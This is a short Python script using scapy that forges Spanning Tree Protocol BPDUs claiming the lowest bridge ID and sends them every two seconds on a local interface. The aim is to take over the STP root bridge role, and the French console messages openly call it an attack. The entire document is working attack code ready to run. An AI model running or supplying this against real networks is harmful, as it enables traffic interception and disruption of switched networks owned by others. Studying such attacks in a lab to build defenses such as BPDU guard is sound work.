from scapy.all import *
import time

interface = "enp0s3"

def send_stp_root_becoming():
    print(f"[*] Lancement de l attaque qui attaque vers {interface}...")
    
    pkt = Dot3(dst="01:80:c2:00:00:00") / \
          LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
          STP(
              proto=0,
              version=0,
              bpdutype=0,
              bpduflags=0,
              rootid=0,
              rootmac="00:00:00:00:00:01",
              pathcost=0,
              bridgeid=0,
              bridgemac="00:00:00:00:00:01",
              portid=0x8001,
              maxage=20,
              hellotime=2,
              forwarddelay=15
          )

    try:
        while True:
            sendp(pkt, iface=interface, verbose=False)
            print("[+] BPDU envoye : je suis le nv big boss ")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Dommage mais non ")

if __name__ == "__main__":
    send_stp_root_becoming()
